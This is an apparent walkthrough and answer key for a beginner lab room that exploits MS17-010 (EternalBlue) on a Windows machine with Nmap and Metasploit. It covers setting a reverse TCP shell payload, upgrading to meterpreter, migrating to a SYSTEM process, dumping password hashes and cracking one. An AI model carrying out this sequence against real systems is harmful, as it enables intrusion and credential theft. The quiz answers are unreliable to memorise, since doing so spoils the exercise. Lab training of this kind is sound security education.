# Task 1 Recon

Scan and learn what exploit this machine is vulnerable to. Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up. This room is not meant to be a boot2root CTF, rather, this is an educational series for complete beginners. Professionals will likely get very little out of this room beyond basic practice as the process here is meant to be beginner-focused.  

### No.1 Scan the machine. (If you are unsure how to tackle this, I recommend checking out the Nmap room)

Ans: 

No answer needed.

### No. 2 How many ports are open with a port number under 1000?

Run this Nmap script to answer this question and question 3: Nmap -sV -sC --script vuln [target_IP] 

Ans: 3

### No.3 What is this machine vulnerable to? (Answer in the form of: ms??-??, ex: ms08-067)

Ans: ms17-010

# Task 2 Gain Access 

Exploit the machine and gain a foothold.

### No. 4 Start Metasploit

Ans: No answer needed

### No. 5 Find the exploitation code we will run against the machine. What is the full path of the code? (Ex: exploit/........)

Search "ms17 in the msfconsole

Ans: exploit/windows/smb/ms17_010_eternalblue

### No. 6 Show options and set the one required value. What is the name of this value? (All caps for submission)

Ans: RHOSTS

#### Usually it would be fine to run this exploit as is; however, for the sake of learning, you should do one more thing before exploiting the target. Enter the following command and press enter:

#### 'set payload windows/x64/shell/reverse_tcp'

### No. 7 With that done, run the exploit!

Ans: No answer needed

### No. 8 Confirm that the exploit has run correctly. You may have to press enter for the DOS shell to appear. Background this shell (CTRL + Z). If this failed, you may have to reboot the target VM. Try running it again before a reboot of the target. 

Ans: No answer needed

---

# Task 3 Escalate

Escalate privileges, learn how to upgrade shells in metasploit.


### No. 9 If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected) 

Google how to convert a shell to meterpreter

Ans: post/multi/manage/shell_to_meterpreter

### No. 10 Select this (use MODULE_PATH). Show options, what option are we required to change?

Use the module in the previous answer and run the show options command

Ans: SESSION

### No. 11 Set the required option, you may need to list all of the sessions to find your target here. 

Run the "sessions" command to see running background sessions. Next step will be to SET the SESSION value to the desired session.

Ans: No answer needed

### No. 12 Run! If this doesn't work, try completing the exploit from the previous task once more.

Ans: No answer needed

### No. 13 Once the meterpreter shell conversion completes, select that session for use.

Ans: No answer needed

### No. 14 Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this. Feel free to open a dos shell via the command 'shell' and run 'whoami'. This should return that we are indeed system. Background this shell afterwards and select our meterpreter session for usage again. 

Ans: No answer needed

### No. 15 List all of the processes running via the 'ps' command. Just because we are system doesn't mean our process is. Find a process towards the bottom of this list that is running at NT AUTHORITY\SYSTEM and write down the process id (far left column).

Ans: No answer needed

### No. 16 Migrate to this process using the 'migrate PROCESS_ID' command where the process id is the one you just wrote down in the previous step. This may take several attempts, migrating processes is not very stable. If this fails, you may need to re-run the conversion process or reboot the machine and start once again. If this happens, try a different process next time. 

Ans: No answer needed

---

# Task 4 Cracking

Dump the non-default user's password and crack it!

### No. 17 Within our elevated meterpreter shell, run the command 'hashdump'. This will dump all of the passwords on the machine as long as we have the correct privileges to do so. What is the name of the non-default user? 

Ans: Jon

### No. 18 Copy this password hash to a file and research how to crack it. What is the cracked password?

Use Crackstation.net

Ans: alqfna22

---

# Task 5 Find Flags

Find the three flags planted on this machine. These are not traditional flags, rather, they're meant to represent key locations within the Windows system. Use the hints provided below to complete this room!

### No. 19 Flag1? This flag can be found at the system root. 

Ans: Cd to the sytem root

### No. 20 Flag2? This flag can be found at the location where passwords are stored within Windows. *Errata: Windows really doesn't like the location of this flag and can occasionally delete it. It may be necessary in some cases to terminate/restart the machine and rerun the exploit to find this flag. This relatively rare, however, it can happen. 

Ans: Cd back to the /windows/System32 directory and check the Config directory

### No. 21 flag3? This flag can be found in an excellent location to loot. After all, Administrators usually have pretty interesting things saved. 

Ans: Check the Admin account documents (admin is not the name of the user account)

---

# References
- 

---

# Tools Used
- Nmap
- Metasploit
- Crackstation
